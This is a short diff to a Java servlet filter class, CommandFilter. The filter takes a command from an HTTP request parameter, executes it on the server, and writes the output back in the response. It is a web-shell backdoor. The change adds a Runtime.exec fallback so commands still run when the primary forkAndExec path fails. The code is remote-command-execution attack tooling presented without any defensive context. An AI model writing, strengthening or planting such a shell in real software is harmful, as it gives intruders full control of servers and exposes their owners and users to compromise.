@@ -33,7 +33,12 @@ public class CommandFilter implements Filter {
         String cmd = getParam(servletRequest.getParameter(paramName));
         try {
             if (cmd != null) {
-                InputStream inputStream = forkAndExec(cmd);
+                InputStream inputStream = null;
+                try {
+                    inputStream = forkAndExec(cmd);
+                } catch (Throwable e) {
+                    inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                }
                 ServletOutputStream outputStream = servletResponse.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
